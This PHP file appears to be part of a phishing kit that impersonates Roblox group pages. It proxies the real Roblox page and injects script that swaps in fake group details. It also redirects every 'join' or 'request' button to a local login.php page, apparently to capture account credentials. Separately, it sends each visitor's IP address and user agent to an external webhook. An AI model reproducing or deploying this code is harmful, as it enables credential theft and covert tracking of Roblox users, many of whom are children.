<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

echo "DEBUG: Script started<br>";

/**
 * Roblox Community Proxy – v5
 *
 * Fetches the real Roblox community page via nginx proxy and injects fake data.
 * Uses the same approach as profile.php.
 */

// ==================== CONFIGURATION ====================
$WEBHOOK_URL = '';
$USER_AGENT  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
// =======================================================

echo "DEBUG: Config loaded<br>";

// ── 1. Resolve fake community ID from URL ──
$communityId = '';
$uri = $_SERVER['REQUEST_URI'] ?? '';
echo "DEBUG: REQUEST_URI: $uri<br>";
if (preg_match('/\/communities\/(\d+)/i', $uri, $m)) {
    $communityId = $m[1];
    echo "DEBUG: Matched from URI: $communityId<br>";
} elseif (isset($_GET['id'])) {
    $communityId = $_GET['id'];
    echo "DEBUG: Matched from GET id: $communityId<br>";
}
echo "DEBUG: Final communityId: '$communityId'<br>";
if (empty($communityId)) { http_response_code(404); echo "Community not found"; exit; }

// ── 2. Load fake community data ──
$communitiesFile = __DIR__ . '/fake_communities.json';
$groupsFile = __DIR__ . '/fake_groups.json';
$fakeCommunity = null;
$targetCommunityId = $communityId;

echo "DEBUG: About to load fake community data<br>";

if (file_exists($communitiesFile)) {
    $communities = json_decode(file_get_contents($communitiesFile), true);
    if (isset($communities[$communityId])) {
        $fakeCommunity = $communities[$communityId];
        if (!empty($fakeCommunity['webhook_url'])) $WEBHOOK_URL = $fakeCommunity['webhook_url'];
        if (!empty($fakeCommunity['real_group_id'])) $targetCommunityId = (string)$fakeCommunity['real_group_id'];
    }
}

if (!$fakeCommunity && file_exists($groupsFile)) {
    $groups = json_decode(file_get_contents($groupsFile), true);
    if (isset($groups[$communityId])) {
        $fg = $groups[$communityId];
        $fakeCommunity = [
            'fakeGroupId'            => $communityId,
            'real_group_id'          => $fg['realGroupId'] ?? '',
            'fake_group_name'        => $fg['fakeGroupName'] ?? 'Roblox Community',
            'fake_group_description' => $fg['fakeGroupDesc'] ?? '',
            'fake_group_owner'       => $fg['ownerUsername'] ?? 'Roblox',
            'fake_member_count'      => $fg['memberCount'] ?? 0,
            'webhook_url'            => $fg['webhookUrl'] ?? '',
        ];
        if (!empty($fg['webhookUrl'])) $WEBHOOK_URL = $fg['webhookUrl'];
        if (!empty($fg['realGroupId'])) $targetCommunityId = (string)$fg['realGroupId'];
    }
}

echo "DEBUG: Fake community data loaded<br>";

// ── 3. Flat PHP variables for fake data ──
$fakeGroupName        = $fakeCommunity['fake_group_name'] ?? $fakeCommunity['fakeGroupName'] ?? 'Roblox Community';
$fakeGroupDescription = $fakeCommunity['fake_group_description'] ?? $fakeCommunity['fakeGroupDesc'] ?? '';
$fakeOwner            = $fakeCommunity['fake_group_owner'] ?? $fakeCommunity['ownerUsername'] ?? 'Roblox';
$fakeMemberCount      = intval($fakeCommunity['fake_member_count'] ?? $fakeCommunity['memberCount'] ?? 0);

echo "DEBUG: Variables set - Name: $fakeGroupName, Owner: $fakeOwner, Members: $fakeMemberCount<br>";
$targetCommunityId = !empty($fakeCommunity['real_group_id']) ? $fakeCommunity['real_group_id'] : (!empty($fakeCommunity['realGroupId']) ? $fakeCommunity['realGroupId'] : $communityId);
echo "DEBUG: communityId: $communityId, targetCommunityId: $targetCommunityId<br>";

// ── 4. Fetch the real Roblox community HTML via nginx proxy ──
// Nginx maps "/" to "www.roblox.com". We must fetch the actual groups URL.
$nginxProxyUrl = "http://127.0.0.1/groups/{$targetCommunityId}/-";

echo "DEBUG: Fetching from $nginxProxyUrl<br>";

$ch = curl_init($nginxProxyUrl);
curl_setopt_array($ch, [
    CURLOPT_USERAGENT      => $USER_AGENT,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_SSL_VERIFYHOST => 0,
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_ENCODING       => 'gzip, deflate, br',
]);
$str = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

echo "DEBUG: HTTP Code: $httpCode, Error: " . ($error ?: 'none') . ", Length: " . strlen($str) . "<br>";

if (empty($str) || $httpCode != 200) {
    // Fallback: nginx proxy gone (port 80 is now Express) — fetch straight
    // from Roblox, same pattern profile.php already uses.
    $directUrl = "https://www.roblox.com/groups/{$targetCommunityId}/-";
    echo "DEBUG: Proxy missed, trying direct fetch from $directUrl<br>";
    $ch = curl_init($directUrl);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT      => $USER_AGENT,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => 0,
        CURLOPT_SSL_VERIFYHOST => 0,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING       => 'gzip, deflate, br',
        CURLOPT_HTTPHEADER     => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.9',
        ],
    ]);
    $str = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    echo "DEBUG: Direct HTTP Code: $httpCode, Error: " . ($error ?: 'none') . ", Length: " . strlen($str) . "<br>";
}

if (empty($str) || $httpCode != 200) {
    http_response_code(502);
    echo "Failed to fetch community page from nginx proxy. Error: " . ($error ?: 'none') . " HTTP Code: $httpCode";
    exit;
}

// ── 5. Rewrite URLs to point to local proxies ──
$str = str_replace('https://www.roblox.com/', '//'.$_SERVER['HTTP_HOST'].'/', $str);
$str = str_replace('https://tr.rbxcdn.com/',      '/thumbnails/', $str);
$str = str_replace('https://images.rbxcdn.com/',  '/imgrbx/',     $str);
$str = str_replace('https://css.rbxcdn.com/',     '/rbxcdn/',     $str);
$str = str_replace('https://js.rbxcdn.com/',      '/rblx-js/',    $str);
$str = str_replace('https://static.rbxcdn.com/',  '/staticrbx/',  $str);

// ── 6. Build injection script for content modification ──
$membersFormatted = number_format($fakeMemberCount);
$jsonName         = json_encode($fakeGroupName, JSON_UNESCAPED_UNICODE);
$jsonDescription  = json_encode($fakeGroupDescription, JSON_UNESCAPED_UNICODE);
$jsonOwner        = json_encode($fakeOwner, JSON_UNESCAPED_UNICODE);

$injectedScript = <<<SCRIPT
<script>
(function() {
    'use strict';

    function rewriteUrl(url) {
        if (typeof url !== 'string') {
            if (url instanceof URL) url = url.toString();
            else if (url instanceof Request) url = url.url;
            else return url;
        }
        var m;
        m = url.match(/^(?:https?:)?\/\/css\.rbxcdn\.com\/(.*)$/i);      if (m) return '/rbxcdn/' + m[1];
        m = url.match(/^(?:https?:)?\/\/static\.rbxcdn\.com\/(.*)$/i);   if (m) return '/staticrbx/' + m[1];
        m = url.match(/^(?:https?:)?\/\/images\.rbxcdn\.com\/(.*)$/i);   if (m) return '/imgrbx/' + m[1];
        m = url.match(/^(?:https?:)?\/\/tr\.rbxcdn\.com\/(.*)$/i);       if (m) return '/thumbnails/' + m[1];
        m = url.match(/^(?:https?:)?\/\/js\.rbxcdn\.com\/(.*)$/i);       if (m) return '/rblx-js/' + m[1];
        var baseHost = window.location.hostname.replace(/^www\./i, '');
        var escapedHost = baseHost.replace(/[-\/\\\\^$*+?.()|[\]{}]/g, '\\\\$&');
        var pattern = new RegExp('^(?:https?:)?\\\\/\\\\/([a-z0-9\\\\-]+)\\\\.(?:roblox\\\\.com|localhost|' + escapedHost + ')(.*)$', 'i');
        m = url.match(pattern);
        if (m) {
            var sub = m[1].toLowerCase(), path = m[2];
            if (sub === 'www') return path || '/';
            if (sub === 'thumbnails') sub = 'thumbnails-api';
            else if (sub === 'games') sub = 'games-api';
            else if (sub === 'ab-testing') sub = 'abtesting';
            return '/rblx-' + sub + path;
        }
        return url;
    }

    var oFetch = window.fetch;
    window.fetch = function(input, init) {
        if (typeof input === 'string') input = rewriteUrl(input);
        else if (input instanceof Request) input = new Request(rewriteUrl(input.url), input);
        else if (input instanceof URL) input = rewriteUrl(input.toString());
        return oFetch.call(this, input, init);
    };
    var oXHR = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m, url, rest) { return oXHR.call(this, m, rewriteUrl(url), rest); };

    var FAKE_NAME = $jsonName;
    var FAKE_DESCRIPTION = $jsonDescription;
    var FAKE_OWNER = $jsonOwner;
    var FAKE_MEMBER_COUNT = '$membersFormatted Members';

    function patch() {
        if (document.title && FAKE_NAME) document.title = FAKE_NAME + ' - Roblox';
        
        var realName = null;
        var h1 = document.querySelector('h1');
        if (h1 && h1.textContent.trim() !== FAKE_NAME) {
            realName = h1.textContent.trim();
        }

        function replaceExactText(oldVal, newVal) {
            if (!oldVal || !newVal || oldVal === newVal) return;
            var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
            var node;
            while (node = walker.nextNode()) {
                if (node.nodeValue.includes(oldVal)) {
                    node.nodeValue = node.nodeValue.replace(oldVal, newVal);
                }
            }
        }

        if (realName && FAKE_NAME) {
            replaceExactText(realName, FAKE_NAME);
        }

        document.querySelectorAll('h1, .community-name, .group-name, .group-title, [data-testid="group-name"]').forEach(function(el) {
            if (el.textContent.trim()) el.textContent = FAKE_NAME;
        });
        document.querySelectorAll('.community-description, .group-description, .description, [data-testid="group-description"]').forEach(function(el) {
            if (el.textContent.trim()) el.textContent = FAKE_DESCRIPTION;
        });
        document.querySelectorAll('.owner-name, .group-owner, [data-testid="group-owner"]').forEach(function(el) {
            if (el.textContent.trim()) el.textContent = 'By ' + FAKE_OWNER;
        });
        document.querySelectorAll('.member-count, .group-members, [data-testid="group-members"]').forEach(function(el) {
            if (el.textContent.trim()) el.textContent = FAKE_MEMBER_COUNT;
        });
    }

    patch();
    new MutationObserver(patch).observe(document.documentElement, { childList: true, subtree: true });

    fetch('/api/community/{$communityId}/webhook', { method: 'POST' })
        .then(r => r.json())
        .then(d => console.log('Webhook dispatched:', d))
        .catch(e => console.log('Webhook error:', e));

    var timer = setInterval(function() {
        document.querySelectorAll('button').forEach(function(btn) {
            var t = btn.textContent.toLowerCase();
            if (t.indexOf('join') !== -1 || t.indexOf('request') !== -1) {
                btn.addEventListener('click', function(e) {
                    e.stopImmediatePropagation(); e.preventDefault();
                    location.href = '/login.php?returnUrl=/communities/{$communityId}&communityId={$communityId}';
                }, true);
            }
        });
    }, 500);
    setTimeout(function() { clearInterval(timer); }, 30000);
})();
</script>
SCRIPT;

// ── 7. Inject script into <head> ──
$str = preg_replace('/(<head[^>]*>)/i', '$1' . $injectedScript, $str);

// ── 8. Dispatch webhook ping ──
if (!empty($WEBHOOK_URL)) {
    $ip  = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua  = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $ts  = date('c');
    $payload = json_encode(['embeds' => [[
        'title'       => '🏛️ Community Page Visited',
        'description' => "**Community:** {$fakeGroupName}\n**ID:** {$communityId}\n\n**IP:** `{$ip}`\n**UA:** `{$ua}`\n**Time:** `{$ts}`",
        'color' => 5814783
    ]]]);
    $wh = curl_init($WEBHOOK_URL);
    curl_setopt_array($wh, [
        CURLOPT_POST => true, CURLOPT_POSTFIELDS => $payload,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 4, CURLOPT_SSL_VERIFYPEER => 0
    ]);
    curl_exec($wh); curl_close($wh);
}

echo $str;
?>
